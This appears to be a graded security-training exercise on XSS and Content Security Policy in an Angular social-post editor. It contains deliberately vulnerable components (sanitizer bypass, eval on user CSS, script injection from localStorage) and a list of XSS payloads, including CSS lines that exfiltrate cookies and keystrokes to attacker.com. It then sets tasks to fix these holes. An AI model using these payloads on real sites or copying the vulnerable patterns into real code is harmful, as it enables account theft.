# Challenge 1: Advanced XSS & Content Security Policy

**Difficulty:** 4/5  
**Estimated Time:** 2-3 hours  
**Points:** 20 (+ 5 bonus)

---

## Scenario

You're building a social media platform where users can create rich text posts with formatting, images, and links. The platform must allow creative expression while preventing XSS attacks through multiple sophisticated vectors.

**Business Requirements:**
- Users can write posts with HTML formatting
- Support for embedded images and videos
- Allow inline styles for text decoration
- Enable SVG graphics for custom icons
- Support markdown-to-HTML conversion
- Real-time preview of content

**Security Requirements:**
- Prevent all forms of XSS (reflected, stored, DOM-based)
- Implement strict Content Security Policy
- Sanitize user-generated HTML safely
- Prevent CSS injection attacks
- Block SVG-based XSS vectors
- Implement Trusted Types

---

## Vulnerable Code

### `post-editor.component.ts`

```typescript
import { Component } from '@angular/core';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

@Component({
  selector: 'app-post-editor',
  template: `
    <div class="editor">
      <h2>Create Post</h2>
      
      <!-- Input for post content -->
      <textarea 
        [(ngModel)]="postContent"
        placeholder="Write your post (HTML allowed)..."
        rows="10"
      ></textarea>
      
      <!-- Preview section -->
      <div class="preview">
        <h3>Preview:</h3>
        <div [innerHTML]="getPreview()"></div>
      </div>
      
      <!-- Style customization -->
      <div class="style-options">
        <label>Custom CSS:</label>
        <input 
          [(ngModel)]="customStyle"
          placeholder="e.g., color: red; font-size: 20px;"
        />
        <div [style]="customStyle">Styled text preview</div>
      </div>
      
      <!-- SVG icon uploader -->
      <div class="svg-uploader">
        <label>Upload SVG Icon:</label>
        <textarea 
          [(ngModel)]="svgContent"
          placeholder="Paste SVG code here..."
        ></textarea>
        <div [innerHTML]="svgContent"></div>
      </div>
      
      <!-- Image URL input -->
      <input 
        [(ngModel)]="imageUrl"
        placeholder="Image URL"
      />
      <img [src]="imageUrl" alt="User image" />
      
      <button (click)="savePost()">Publish Post</button>
    </div>
  `,
  styles: [`
    .editor { padding: 20px; }
    .preview { border: 1px solid #ccc; padding: 10px; margin: 10px 0; }
    textarea { width: 100%; }
  `]
})
export class PostEditorComponent {
  postContent = '';
  customStyle = '';
  svgContent = '';
  imageUrl = '';
  
  constructor(private sanitizer: DomSanitizer) {}
  
  getPreview(): SafeHtml {
    // VULNERABILITY: Bypassing sanitizer
    return this.sanitizer.bypassSecurityTrustHtml(this.postContent);
  }
  
  savePost(): void {
    // VULNERABILITY: Storing unsanitized content
    localStorage.setItem('userPost', this.postContent);
    localStorage.setItem('userStyle', this.customStyle);
    localStorage.setItem('userSvg', this.svgContent);
    
    // VULNERABILITY: Using eval with user input
    const styleObject = eval('({' + this.customStyle + '})');
    console.log('Applied styles:', styleObject);
  }
}
```

### `post-viewer.component.ts`

```typescript
import { Component, OnInit } from '@angular/core';

@Component({
  selector: 'app-post-viewer',
  template: `
    <div class="post" [innerHTML]="postHtml"></div>
    <div class="post-style" [style]="postStyle"></div>
    <div class="post-svg" [innerHTML]="postSvg"></div>
  `
})
export class PostViewerComponent implements OnInit {
  postHtml = '';
  postStyle = '';
  postSvg = '';
  
  ngOnInit(): void {
    // VULNERABILITY: Loading and rendering unsanitized content
    this.postHtml = localStorage.getItem('userPost') || '';
    this.postStyle = localStorage.getItem('userStyle') || '';
    this.postSvg = localStorage.getItem('userSvg') || '';
    
    // VULNERABILITY: Dynamic script execution
    this.executeUserScripts();
  }
  
  executeUserScripts(): void {
    // VULNERABILITY: Creating script from user content
    const scriptContent = localStorage.getItem('userScript');
    if (scriptContent) {
      const script = document.createElement('script');
      script.textContent = scriptContent;
      document.body.appendChild(script);
    }
  }
}
```

### `markdown-parser.service.ts`

```typescript
import { Injectable } from '@angular/core';

@Injectable({
  providedIn: 'root'
})
export class MarkdownParserService {
  
  parseMarkdown(markdown: string): string {
    // VULNERABILITY: Naive markdown parsing with XSS vectors
    let html = markdown;
    
    // Convert markdown syntax to HTML
    html = html.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
    html = html.replace(/\*(.*?)\*/g, '<em>$1</em>');
    html = html.replace(/\[(.*?)\]\((.*?)\)/g, '<a href="$2">$1</a>');
    html = html.replace(/!\[(.*?)\]\((.*?)\)/g, '<img src="$2" alt="$1">');
    
    // VULNERABILITY: Allow arbitrary HTML
    html = html.replace(/<html>(.*?)<\/html>/gs, '$1');
    
    return html;
  }
}
```

---

## Attack Scenarios

### Attack 1: Basic Stored XSS
```html
<img src=x onerror="alert('XSS')">
```

### Attack 2: JavaScript URL Scheme
```html
<a href="javascript:alert(document.cookie)">Click me</a>
```

### Attack 3: CSS Injection Data Exfiltration
```css
background: url('https://attacker.com/steal?data=' + document.cookie);
```

### Attack 4: SVG-based XSS
```xml
<svg><script>alert('XSS')</script></svg>
```

### Attack 5: mXSS (Mutation XSS)
```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert('XSS')>
```

### Attack 6: Angular Binding Injection
```html
{{constructor.constructor('alert(1)')()}}
```

### Attack 7: CSS Keylogger
```css
input[value^="a"] { background: url('https://attacker.com/?key=a'); }
input[value^="b"] { background: url('https://attacker.com/?key=b'); }
/* ... for each character */
```

### Attack 8: UTF-7 XSS
```html
+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-
```

---

## Your Tasks

### Task 1: Identify All Vulnerabilities (4 pts)

Create `VULNERABILITIES.md` documenting:
1. Each XSS vector found
2. OWASP category (A03:2021 - Injection)
3. Severity (Critical/High/Medium/Low)
4. Proof of concept payload
5. Potential impact

**Hint:** There are at least 10 distinct vulnerabilities.

### Task 2: Implement Secure Content Handling (8 pts)

Fix the code to:

1. **Properly Sanitize HTML**
   - Use Angular's DomSanitizer correctly
   - Implement DOMPurify for user-generated HTML
   - Never use `bypassSecurityTrustHtml()` with user input

2. **Implement Content Security Policy**
   - Create strict CSP headers
   - Use nonces for inline scripts/styles
   - Block unsafe-eval and unsafe-inline
   - Implement CSP violation reporting

3. **Sanitize CSS Input**
   - Validate style properties
   - Block dangerous CSS functions (url(), expression())
   - Prevent CSS injection attacks

4. **Secure SVG Handling**
   - Sanitize SVG content
   - Remove script elements from SVG
   - Validate SVG structure

5. **Fix Markdown Parser**
   - Sanitize markdown output
   - Prevent HTML injection through markdown
   - Validate URLs in links and images

6. **Implement Trusted Types**
   - Configure Trusted Types policy
   - Create safe HTML creation functions
   - Enforce Trusted Types in dev and prod

### Task 3: Write Security Tests (4 pts)

Create `post-editor.component.spec.ts` with tests for:

```typescript
describe('PostEditorComponent Security', () => {
  it('should prevent XSS through img onerror', () => {
    // Test that <img src=x onerror="alert('XSS')"> is sanitized
  });
  
  it('should block javascript: URLs', () => {
    // Test that javascript:alert(1) URLs are blocked
  });
  
  it('should prevent CSS injection', () => {
    // Test that malicious CSS is sanitized
  });
  
  it('should sanitize SVG content', () => {
    // Test that <svg><script> is removed
  });
  
  it('should prevent mXSS attacks', () => {
    // Test mutation XSS vectors
  });
  
  it('should enforce CSP', () => {
    // Test that CSP headers are present
  });
  
  it('should use Trusted Types', () => {
    // Test that Trusted Types policy is enforced
  });
});
```

### Task 4: Document Your Fixes (2 pts)

Create `FIXES.md` explaining:
- What each vulnerability was
- How you fixed it
- Why the fix works
- Alternative approaches considered

### Task 5: Copilot Usage Report (2 pts)

Create `COPILOT_USAGE.md` documenting:
- Prompts used to generate fixes
- What Copilot got right
- What required manual correction
- Lessons learned

---

## Bonus Challenges (5 pts)

### Bonus 1: Implement Trusted Types API (2 pts)
```typescript
// Configure Trusted Types policy
if (window.trustedTypes && window.trustedTypes.createPolicy) {
  window.trustedTypes.createPolicy('default', {
    createHTML: (string) => DOMPurify.sanitize(string),
    createScriptURL: (string) => /* validate and return safe URL */,
    createScript: (string) => /* validate and return safe script */
  });
}
```

### Bonus 2: CSP Violation Reporting (1 pt)
Implement endpoint to receive and log CSP violations:
```typescript
app.post('/csp-report', (req, res) => {
  console.log('CSP Violation:', req.body);
  // Store violations for analysis
});
```

### Bonus 3: Advanced DOMPurify Configuration (1 pt)
```typescript
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href'],
  ALLOWED_URI_REGEXP: /^https?:\/\//,
  KEEP_CONTENT: true,
  RETURN_TRUSTED_TYPE: true
});
```

### Bonus 4: Automated CSP Testing (1 pt)
Create tests that verify CSP blocks unsafe operations.

---

## Security Requirements Checklist

- [ ] No `bypassSecurityTrustHtml()` with user input
- [ ] DOMPurify integrated and configured
- [ ] CSP headers implemented (no unsafe-inline, no unsafe-eval)
- [ ] Nonces used for legitimate inline scripts/styles
- [ ] CSS sanitization implemented
- [ ] SVG content sanitized
- [ ] Markdown parser secured
- [ ] No eval() or Function() constructor usage
- [ ] Trusted Types policy configured
- [ ] CSP violation reporting implemented
- [ ] All tests passing
- [ ] 80%+ code coverage

---

## Testing Your Solution

### Manual Testing:
```bash
# Start the app
npm start

# Try attack payloads:
# 1. <img src=x onerror="alert('XSS')">
# 2. <svg><script>alert('XSS')</script></svg>
# 3. javascript:alert(1)
# 4. <style>body { display: none; }</style>

# Verify none execute
```

### Automated Testing:
```bash
# Run security tests
npm run test:security

# Check CSP headers
curl -I http://localhost:4200 | grep -i content-security-policy

# Run OWASP ZAP scan
zap-cli quick-scan http://localhost:4200
```

---

## Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [Trusted Types Specification](https://w3c.github.io/webappsec-trusted-types/dist/spec/)
- [mXSS Attack Paper](https://cure53.de/fp170.pdf)

---

## Learning Outcomes

After completing this challenge, you should understand:
- Multiple XSS attack vectors and defenses
- Content Security Policy implementation
- Trusted Types API usage
- Safe HTML sanitization techniques
- CSS injection prevention
- SVG security considerations

**Good luck! This challenge will significantly strengthen your XSS defense skills.** 
